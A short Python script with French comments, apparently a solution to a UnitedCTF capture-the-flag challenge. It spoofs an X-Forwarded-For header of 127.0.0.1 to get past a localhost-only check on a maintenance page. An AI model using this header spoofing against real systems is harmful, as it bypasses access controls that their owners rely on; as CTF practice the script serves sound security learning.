import requests

url = "https://goquick.c.unitedctf.ca/maintenance.php"

# Ajouter l'en-tête X-Forwarded-For pour faire croire que la requête vient de 127.0.0.1
headers = {
    "X-Forwarded-For": "127.0.0.1"
}

response = requests.get(url, headers=headers)

# Afficher la réponse
print(response.text)